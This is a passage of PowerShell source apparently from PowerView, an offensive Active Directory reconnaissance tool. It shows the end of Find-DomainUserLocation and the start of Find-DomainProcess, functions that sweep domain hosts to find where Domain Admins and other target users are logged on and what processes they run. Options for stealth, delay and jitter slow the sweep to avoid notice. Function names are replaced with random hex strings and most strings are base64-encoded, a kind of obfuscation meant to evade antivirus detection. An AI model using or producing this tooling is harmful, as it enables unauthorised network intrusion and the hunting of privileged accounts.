                                ${8ce99e32291646dc9649cd2a24d88211}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                ${8ce99e32291646dc9649cd2a24d88211}
                            }
                        }
                    }
                    if (-not $Stealth) {
                        ${ba16046cc9a4431da8d63fa8f9d86bc5} = edd8a9a976dd456aae0f84fa0f6de36e -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b}
                        ForEach (${a8824b20a55c40d29e08c2f892a05f8e} in ${ba16046cc9a4431da8d63fa8f9d86bc5}) {
                            ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = ${a8824b20a55c40d29e08c2f892a05f8e}.UserName
                            $UserDomain = ${a8824b20a55c40d29e08c2f892a05f8e}.LogonDomain
                            if ((${25e26cdbb7fa4a6c9a2f2483c34b00e6}) -and (${25e26cdbb7fa4a6c9a2f2483c34b00e6}.trim() -ne '')) {
                                if ( (-not ${4b406f96881443dfb2a0a5023913353c}) -or (${4b406f96881443dfb2a0a5023913353c} -contains ${25e26cdbb7fa4a6c9a2f2483c34b00e6}) -and (${25e26cdbb7fa4a6c9a2f2483c34b00e6} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                                    ${1ab4725ddb4a46688da377ff9cc908bd} = @(e2da9d93a1f04bbe8fe558de28bcac3c -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b})[0].IPAddress
                                    ${8ce99e32291646dc9649cd2a24d88211} = New-Object PSObject
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${f54716d2d17141569e4a6cfb0d93653b}
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${1ab4725ddb4a46688da377ff9cc908bd}
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    if ($CheckAccess) {
                                        ${e8029ede0a9443859b57bf753ba2605e} = c046e85b237e4b6eb3504c4f264b59a2 -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b}
                                        ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${e8029ede0a9443859b57bf753ba2605e}.IsAdmin
                                    }
                                    else {
                                        ${8ce99e32291646dc9649cd2a24d88211} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    ${8ce99e32291646dc9649cd2a24d88211}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                    ${8ce99e32291646dc9649cd2a24d88211}
                                }
                            }
                        }
                    }
                }
            }
            if (${d4e1296b557440d7b406a9378e307719}) {
                dcf0a8b111a84302b05d40b1db05338c
            }
        }
        ${9d861c835c924c73aa92c66fb935caca} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
            }
            else {
                ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential -e63bcfc245bf4c15941e2e6d5c906ee3
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${521aceac22ed4af69dedda38f567c0ac} = 0
            ${6c074dff13fb478aa365aea23a93e2d2} = New-Object System.Random
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ca0e0dbccca747a0b83a2af44d4d9165}) {
                ${521aceac22ed4af69dedda38f567c0ac} = ${521aceac22ed4af69dedda38f567c0ac} + 1
                Start-Sleep -Seconds ${6c074dff13fb478aa365aea23a93e2d2}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserLocation] Enumerating server ${a9e149a622e146cb8c4c690f286bb4b0} (${521aceac22ed4af69dedda38f567c0ac} of $(${ca0e0dbccca747a0b83a2af44d4d9165}.Count))"
                Invoke-Command -ScriptBlock ${91e68d106c5344ba911e56802fc167ea} -ArgumentList ${f54716d2d17141569e4a6cfb0d93653b}, ${4b406f96881443dfb2a0a5023913353c}, ${0ce819799cf642488511b0b5b4bace0c}, $Stealth, ${9d861c835c924c73aa92c66fb935caca}
                if (${186e3848daf342ca8207aeecd0de4352} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
            ${96683e5d4de842f184dbc8ff33d066b2} = @{
                'TargetUsers' = ${4b406f96881443dfb2a0a5023913353c}
                'CurrentUser' = ${0ce819799cf642488511b0b5b4bace0c}
                'Stealth' = $Stealth
                'TokenHandle' = ${9d861c835c924c73aa92c66fb935caca}
            }
            afa7981a0a8840e7ae58b8e0c696a5d3 -ac645935110b4eaea96e7bf6f0b2d7f4 ${ca0e0dbccca747a0b83a2af44d4d9165} -d8bca3485d0e4462855c0f18d0a8d91d ${91e68d106c5344ba911e56802fc167ea} -bf25cd70880740848c7344c3829474ee ${96683e5d4de842f184dbc8ff33d066b2} -Threads $Threads
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Find-DomainProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${f613cdfca6cd4ec9830841a185fa0248} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${a641242359464a5bb75a49b867c183a4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${de1879a6375144efa1511357bfecd42f} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${b0dd23003b9d4473818f6e8c6cc2e082} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${f613cdfca6cd4ec9830841a185fa0248}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${fd6c4173863b4be9aa10603a30f19bb1} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${fd6c4173863b4be9aa10603a30f19bb1}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${ca0e0dbccca747a0b83a2af44d4d9165} = ${ac645935110b4eaea96e7bf6f0b2d7f4}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${ca0e0dbccca747a0b83a2af44d4d9165} = cec1def5409041f78ed8ecd436f7fa52 @f613cdfca6cd4ec9830841a185fa0248 | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $(${ca0e0dbccca747a0b83a2af44d4d9165}.Length)"
        if (${ca0e0dbccca747a0b83a2af44d4d9165}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA==')))]) {
            ${c19c85de646e4dfd941dff20846794c3} = @()
            ForEach (${8e98d16908694a7a87c3120a2ab4c2ff} in $ProcessName) {
                ${c19c85de646e4dfd941dff20846794c3} += ${8e98d16908694a7a87c3120a2ab4c2ff}.Split(',')
            }
            if (${c19c85de646e4dfd941dff20846794c3} -isnot [System.Array]) {
                ${c19c85de646e4dfd941dff20846794c3} = [String[]] @(${c19c85de646e4dfd941dff20846794c3})
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${4b406f96881443dfb2a0a5023913353c} = c4bfd1c2423d4aa09ab761a468a38f7e @fd6c4173863b4be9aa10603a30f19bb1 | Select-Object -ExpandProperty samaccountname
        }
        else {
            ${352237a1f2ea46558662166b4069b35c} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${352237a1f2ea46558662166b4069b35c}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${352237a1f2ea46558662166b4069b35c}
            ${4b406f96881443dfb2a0a5023913353c} = d5ea7ec938ad4aeeacb8bc5e972e183f @352237a1f2ea46558662166b4069b35c | Select-Object -ExpandProperty MemberName
        }
        ${91e68d106c5344ba911e56802fc167ea} = {
            Param(${ac645935110b4eaea96e7bf6f0b2d7f4}, $ProcessName, ${4b406f96881443dfb2a0a5023913353c}, $Credential)
            ForEach (${f54716d2d17141569e4a6cfb0d93653b} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
                ${d7b577ae558c406581a98832155768ff} = Test-Connection -Count 1 -Quiet -ComputerName ${f54716d2d17141569e4a6cfb0d93653b}
                if (${d7b577ae558c406581a98832155768ff}) {
                    if ($Credential) {
                        ${75d9bf6e9a954df9b52895e8c879ec1d} = ae175b7b5bd34afd960845c09ce62c83 -Credential $Credential -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b} -ErrorAction SilentlyContinue
                    }
                    else {
                        ${75d9bf6e9a954df9b52895e8c879ec1d} = ae175b7b5bd34afd960845c09ce62c83 -ac645935110b4eaea96e7bf6f0b2d7f4 ${f54716d2d17141569e4a6cfb0d93653b} -ErrorAction SilentlyContinue
                    }
                    ForEach (${50ae829e8660446facfe2f87590f8875} in ${75d9bf6e9a954df9b52895e8c879ec1d}) {
                        if ($ProcessName) {
                            if ($ProcessName -Contains ${50ae829e8660446facfe2f87590f8875}.ProcessName) {
                                ${50ae829e8660446facfe2f87590f8875}
                            }
                        }
                        elseif (${4b406f96881443dfb2a0a5023913353c} -Contains ${50ae829e8660446facfe2f87590f8875}.User) {
                            ${50ae829e8660446facfe2f87590f8875}
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainProcess] Total number of hosts: $(${ca0e0dbccca747a0b83a2af44d4d9165}.count)"
